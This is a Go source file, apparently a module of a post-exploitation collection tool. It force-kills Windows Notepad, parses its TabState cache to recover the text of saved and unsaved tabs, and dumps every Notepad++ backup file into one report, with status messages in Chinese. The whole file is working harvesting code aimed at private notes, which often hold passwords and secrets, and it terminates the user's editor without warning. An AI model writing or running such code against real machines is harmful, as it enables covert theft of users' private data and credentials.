package notepad

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func GetNotepadContent() string {
	var output strings.Builder
	output.WriteString("\n----[  NOTEPAD  ]----\n\n")

	err := checkAndKillProcess("notepad")
	if err != nil {
	}

	tabStatePath, err := findNotepadTabStatePath()
	if err != nil {
		output.WriteString(fmt.Sprintf("查找TabState路径失败: %v\n", err))
		return output.String()
	}

	output.WriteString(fmt.Sprintf("TabState路径: %s\n\n", tabStatePath))

	files, err := ioutil.ReadDir(tabStatePath)
	if err != nil {
		output.WriteString(fmt.Sprintf("读取TabState目录失败: %v\n", err))
		return output.String()
	}

	fileCount := 0
	for _, file := range files {
		if !file.IsDir() {
			fileCount++
			filePath := filepath.Join(tabStatePath, file.Name())
			output.WriteString(fmt.Sprintf("--------------------------------\n"))
			output.WriteString(fmt.Sprintf("处理文件: %s\n", file.Name()))

			fileContent := dealFileType(filePath)
			output.WriteString(fileContent)
		}
	}

	output.WriteString(fmt.Sprintf("找到 %d 个文件\n", fileCount))
	output.WriteString("--------------------------------\n")

	output.WriteString(GetNotepadPPContent())

	return output.String()
}

func checkAndKillProcess(processName string) error {
	cmd := exec.Command("taskkill", "/F", "/IM", processName+".exe")
	output, err := cmd.CombinedOutput()
	if err != nil {

		if !strings.Contains(string(output), "没有运行的任务") {
			return fmt.Errorf("终止进程失败: %v, %s", err, string(output))
		}
	}
	return nil
}

func findNotepadTabStatePath() (string, error) {
	appDataLocalPath, err := os.UserCacheDir()
	if err != nil {
		return "", fmt.Errorf("获取AppData路径失败: %v", err)
	}

	packagesPath := filepath.Join(appDataLocalPath, "Packages")
	entries, err := os.ReadDir(packagesPath)
	if err != nil {
		return "", fmt.Errorf("读取Packages目录失败: %v", err)
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Microsoft.WindowsNotepad_") {
			tabStatePath := filepath.Join(packagesPath, entry.Name(), "LocalState", "TabState")
			if _, err := os.Stat(tabStatePath); err == nil {
				return tabStatePath, nil
			}
		}
	}

	return "", fmt.Errorf("未找到记事本TabState路径")
}

func dealFileType(filePath string) string {
	var output strings.Builder

	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		output.WriteString(fmt.Sprintf("读取文件失败: %v\n", err))
		return output.String()
	}

	if len(data) < 4 {
		output.WriteString("文件数据不完整\n")
		return output.String()
	}

	fourthByte := data[3]

	if fourthByte == 1 {
		output.WriteString("状态: ( 已保存在本地的文件 √)\n")
		savedFileContent := processSavedFile(data)
		output.WriteString(savedFileContent)
	} else {
		output.WriteString("状态: ( 未保存本地的临时文件 √)\n")
		unsavedFileContent := processUnsavedFile(data)
		output.WriteString(unsavedFileContent)
	}

	return output.String()
}

func processSavedFile(data []byte) string {
	var output strings.Builder

	if len(data) < 6 {
		output.WriteString("文件数据不完整\n")
		return output.String()
	}

	headerCalc := 3 + 1 + 1

	filePathLength := int(data[4])

	filePathByteLength := filePathLength * 2

	if len(data) < 5+filePathByteLength+2 {
		output.WriteString("[-] 文件数据不完整，无法读取文件路径\n")
		return output.String()
	}

	filePathBytes := data[5 : 5+filePathByteLength]
	filePath := decodeText(filePathBytes)
	output.WriteString(fmt.Sprintf("文件名: %s\n", filePath))

	headerCalc += filePathByteLength

	contentLengthPos := 5 + filePathByteLength
	a := int(data[contentLengthPos])

	var contentLength int
	var status bool

	if len(data) < contentLengthPos+3 {
		output.WriteString("文件数据不完整，无法读取内容长度\n")
		return output.String()
	}

	b := int(data[contentLengthPos+1])
	z := int(data[contentLengthPos+2])

	if b == 5 && z == 1 {

		contentLength = a
		status = true
		headerCalc += 2
	} else {

		c := 0x80
		contentLength = (a - c) + (b * c)
		status = false
		headerCalc += 3
	}

	output.WriteString(fmt.Sprintf("内容长度: %d\n", contentLength))

	var paddingSize int
	if status {
		paddingSize = 50
	} else {
		paddingSize = 53
	}

	contentStartPos := headerCalc + paddingSize

	if len(data) < contentStartPos+6 {
		output.WriteString("文件数据不完整，无法读取内容\n")
		return output.String()
	}

	contentEndPos := len(data) - 6

	if contentStartPos >= contentEndPos {
		output.WriteString("内容区域计算错误\n")
		return output.String()
	}

	contentBytes := data[contentStartPos:contentEndPos]

	content := string(contentBytes)

	content = strings.ReplaceAll(content, "\r", "\r\n")

	output.WriteString("内容:\n")
	output.WriteString(content)
	output.WriteString("\n")

	return output.String()
}

func processUnsavedFile(data []byte) string {
	var output strings.Builder

	if len(data) < 20 {
		output.WriteString("[*] 文件数据不完整，长度不足\n")
		return output.String()
	}

	startPos := 12

	count := len(data) - startPos - 5

	if count <= 0 {
		output.WriteString("文件数据不完整，无法读取内容\n")
		return output.String()
	}

	contentBytes := data[startPos : len(data)-5]
	content := string(contentBytes)

	output.WriteString("内容:\n")
	output.WriteString(content)
	output.WriteString("\n")

	return output.String()
}

func isPrintableString(s string) bool {
	printableChars := 0
	totalChars := 0

	for _, r := range s {
		totalChars++
		if (r >= 32 && r < 127) ||
			(r >= 0x4E00 && r <= 0x9FFF) ||
			(r >= 0x3000 && r <= 0x303F) ||
			(r == '\n' || r == '\r' || r == '\t') {
			printableChars++
		}
	}

	return totalChars > 0 && float64(printableChars)/float64(totalChars) > 0.7
}

func containsPrintableChars(s string) bool {
	for _, r := range s {
		if r >= 32 && r < 127 || r > 255 {
			return true
		}
	}
	return false
}

func GetNotepadPPContent() string {
	var output strings.Builder
	output.WriteString("\n----[  NOTEPAD++  ]----\n\n")

	username, err := getUserName()
	if err != nil {
		output.WriteString(fmt.Sprintf("获取用户名失败: %v\n", err))
		return output.String()
	}

	directoryPath := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\Notepad++\\backup", username)

	if _, err := os.Stat(directoryPath); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("目录 %s 不存在\n", directoryPath))
		return output.String()
	}

	files, err := ioutil.ReadDir(directoryPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("读取目录失败: %v\n", err))
		return output.String()
	}

	output.WriteString(fmt.Sprintf("总文件数: %d\n", len(files)))

	for _, file := range files {
		if !file.IsDir() {
			filePath := filepath.Join(directoryPath, file.Name())
			output.WriteString(fmt.Sprintf("读取文件: %s\n", filePath))

			content, err := ioutil.ReadFile(filePath)
			if err != nil {
				output.WriteString(fmt.Sprintf("读取文件失败: %v\n", err))
				continue
			}

			output.WriteString(string(content))
			output.WriteString("\n--------------------------------\n")
		}
	}

	return output.String()
}

func getUserName() (string, error) {
	cmd := exec.Command("whoami")
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}

	parts := strings.Split(strings.TrimSpace(string(output)), "\\")
	if len(parts) > 1 {
		return parts[1], nil
	}
	return strings.TrimSpace(string(output)), nil
}

func extractAllContent(data []byte, output *strings.Builder) {

	if len(data) < 4 {
		output.WriteString("文件数据不完整\n")
		return
	}

	if len(data) >= 3 {
		output.WriteString(fmt.Sprintf("Magic Header: %X %X %X\n", data[0], data[1], data[2]))
	}

	fourthByte := data[3]

	if fourthByte == 1 {
		output.WriteString("----( 已保存文件  √)----\n")
	} else {
		output.WriteString("----(未保存文件 ×)----\n")
	}

	if len(data) >= 5 {
		filePathLength := int(data[4])
		output.WriteString(fmt.Sprintf("文件路径长度: %d\n", filePathLength))

		if len(data) >= 5+filePathLength*2 {
			filePathBytes := data[5 : 5+filePathLength*2]
			filePath := decodeText(filePathBytes)
			output.WriteString(fmt.Sprintf("文件名: %s\n", filePath))
		}
	}

	possibleStartPositions := []int{12, 60, 100, 150}

	output.WriteString("尝试提取内容:\n")

	for _, startPos := range possibleStartPositions {
		if len(data) > startPos+10 {

			endPos := len(data)
			if endPos > startPos+1000 {
				endPos = startPos + 1000
			}

			contentBytes := data[startPos:endPos]
			content := decodeText(contentBytes)

			if len(strings.TrimSpace(content)) > 0 && containsPrintableChars(content) {
				output.WriteString(fmt.Sprintf("--- 从位置 %d 开始的内容 ---\n", startPos))
				output.WriteString(content)
				output.WriteString("\n")
				break
			}
		}
	}

	if len(data) > 4 {
		content := decodeText(data[4:])
		if len(strings.TrimSpace(content)) > 0 && containsPrintableChars(content) {
			output.WriteString("--- 整个文件内容 ---\n")
			output.WriteString(content)
			output.WriteString("\n")
		}
	}
}

func decodeText(data []byte) string {

	directString := string(data)
	if isPrintableString(directString) {

		return directString
	}

	if len(data) >= 2 && len(data)%2 == 0 {

		var result strings.Builder
		for i := 0; i < len(data); i += 2 {

			if i+1 < len(data) {
				char := uint16(data[i]) | (uint16(data[i+1]) << 8)
				if char != 0 {
					result.WriteRune(rune(char))
				}
			}
		}

		decoded := result.String()

		if isPrintableString(decoded) {
			return decoded
		}
	}

	return directString
}
